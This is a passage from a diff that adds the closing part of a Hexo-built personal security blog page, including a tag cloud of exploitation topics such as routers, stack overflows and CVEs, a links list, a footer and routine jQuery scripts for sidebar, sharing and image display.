+				<li><a href="/tags/iot/" title="iot">iot<sup>15</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/路由器/" title="路由器">路由器<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve/" title="cve">cve<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/环境搭建/" title="环境搭建">环境搭建<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令注入/" title="命令注入">命令注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/命令执行/" title="命令执行">命令执行<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/认证绕过/" title="认证绕过">认证绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/摄像头/" title="摄像头">摄像头<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/待完善/" title="待完善">待完善<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2024 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
